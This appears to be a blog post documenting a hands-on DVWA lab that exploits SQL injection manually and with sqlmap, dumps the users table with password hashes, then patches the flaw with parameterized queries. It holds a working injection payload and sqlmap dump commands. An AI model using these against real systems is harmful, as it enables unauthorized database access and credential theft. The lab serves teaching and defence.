---
layout: post
title:  "Hands‑On SQL Injection Lab: DVWA from Exploit to Patch"
date: 2025-07-29 18:59:00 -0500
categories: pentesting web-security sql-injection
tags: [DVWA, SQLi, penetration-testing, cyber-security, git]
---

In this lab, we’ll walk through a complete **SQL Injection** lifecycle using the Damn Vulnerable Web Application (DVWA). You’ll learn how to:

1. **Set up** a two‑VM environment: Kali Linux (attacker) & Ubuntu + DVWA (target)  
2. **Manually exploit** the SQLi vulnerability  
3. **Automate** the attack with `sqlmap`  
4. **Troubleshoot** sessions, redirects, and cookie issues  
5. **Patch** the vulnerability and **verify** the fix

## TL;DR

- **Setup**: Two‑VM lab with Kali Linux (attacker) and Ubuntu + DVWA (target)  
- **Manual Exploit**: Used `1' OR '1'='1` in DVWA’s SQLi page to retrieve user records  
- **Automation**: Leveraged `sqlmap` with valid `PHPSESSID` and `security=low` cookies to dump the `dvwa.users` table  
- **Troubleshooting**: Resolved 302 redirects, cookie formatting, URL quoting, and cache issues (`--flush-session`)  
- **Patch**: Switched DVWA to “High” security—uses PDO parameterized queries—and confirmed injection is blocked  
- **Key Lesson**: Always use parameterized queries to prevent SQL Injection; hands‑on debugging is as important as the exploit.  

---

## 🛠 Environment Setup

1. **Ubuntu Server** VM (DVWA target)  
   - Install Apache, PHP, MySQL:  
     ```bash
     sudo apt update
     sudo apt install -y apache2 php libapache2-mod-php php-mysql mysql-server
     ```
   - Clone DVWA and configure database:  
     ```bash
     cd /var/www/html
     sudo git clone https://github.com/digininja/DVWA.git
     cd DVWA/config
     sudo cp config.inc.php.dist config.inc.php
     ```
   - Edit `config.inc.php`:
     ```php
     $_DVWA['db_user']                 = 'dvwauser';
     $_DVWA['db_password']             = 'password';
     $_DVWA['enable_phpids']           = false;
     $_DVWA['disable_authentication_tokens'] = true;
     ```
   - Create database & user in MySQL:
     ```sql
     CREATE DATABASE dvwa;
     CREATE USER 'dvwauser'@'localhost' IDENTIFIED BY 'password';
     GRANT ALL ON dvwa.* TO 'dvwauser'@'localhost';
     FLUSH PRIVILEGES;
     ```
   - Restart Apache and complete setup at `http://<IP>/DVWA/setup.php`.

   ![DVWA Setup Success](/assets/dvwa-setup.png)
   Ensure you follow DVWA set-up carefully as a misconfigured file gave me quite the headache!

2. **Kali Linux** VM (Attacker)  
   - Install tools:
     ```bash
     sudo apt update
     sudo apt install -y sqlmap curl
     ```
   - Ensure you can browse to DVWA (`admin`/`password`) and set security **Low**.

---

## 🔍 Phase 1: Manual SQL Injection

Navigate to:

```
http://<IP>/DVWA/vulnerabilities/sqli/
```

Enter in **ID** field:
```
1' OR '1'='1
```
Submit and observe multiple user records returned—proof of SQLi.

![](/assets/manual-sqli.png)

---

## 🤖 Phase 2: Automating with sqlmap

1. **Grab your session cookie** from the Kali browser (`PHPSESSID`, `security=low`).  
2. **Verify** access to the injection point:
   ```bash
   curl -IL --cookie "PHPSESSID=<ID>; security=low" \
       "http://<IP>/DVWA/vulnerabilities/sqli/?id=1"
   # Expect HTTP/1.1 200 OK
   ```

3. **Enumerate databases**:
   ```bash
   sqlmap -u "http://<IP>/DVWA/vulnerabilities/sqli/?id=1" \
     --cookie="PHPSESSID=<ID>; security=low" \
     --dbs --batch --flush-session
   ```
4. **Dump `users` table**:
   ```bash
   sqlmap -u "http://<IP>/DVWA/vulnerabilities/sqli/?id=1" \
     --cookie="PHPSESSID=<ID>; security=low" \
     -D dvwa -T users --dump --batch --flush-session
   ```

   You’ll retrieve `user_id`, `user`, and MD5 `password` hashes.

![](/assets/sqlmap-dump.png)

---

## 🔧 Troubleshooting Highlights

* **302 Redirects**: Ensure you log in from **Kali VM**, not host.
* **Cookie Errors**: Use correct format:
  ```
  --cookie="PHPSESSID=<ID>; security=low"
  ```
* **Malformed URL**: Wrap URL in quotes, include `?id=1`.
* **Cache Issues**: Use `--flush-session` to clear sqlmap cache.

---

## 🛡 Phase 3: Patching & Verification

1. In DVWA **Security** menu, set to **High** → Submit.
2. Review `high.php`—it uses PDO parameterized queries:
   ```php
   $stmt = $pdo->prepare("SELECT first_name, last_name FROM users WHERE user_id = :id");
   $stmt->bindParam(':id', $_GET['id'], PDO::PARAM_INT);
   $stmt->execute();
   ```
3. **Retest**:
   * Manual payload `1' OR '1'='1` → **no data**
   * `sqlmap --dbs` → **no injectable parameters**

![](/assets/patch-verified.png)

---

## 🎓 Key Takeaways

* **SQL Injection** exploits unvalidated input—classic payload `1' OR '1'='1`.
* Tools like **sqlmap** automate enumeration but require proper cookies & session context.
* **Prepared statements** are the gold‑standard defense against SQLi.
* Hands‑on troubleshooting is as critical as the exploit itself.

---

## 📂 Resources

* **GitHub Repo:** [JohnSeanson/sql-injection-dvwa-lab](https://github.com/JohnSeanson/sql-injection-dvwa-lab)
* **Live Report:** [johnseanson.github.io](https://johnseanson.github.io)
* **DVWA:** [https://github.com/digininja/DVWA](https://github.com/digininja/DVWA)
* **sqlmap:** [https://github.com/sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)

---

*Ready to try it yourself? Fork the repo, spin up your VMs, and share your results! Happy hacking and stay secure.*
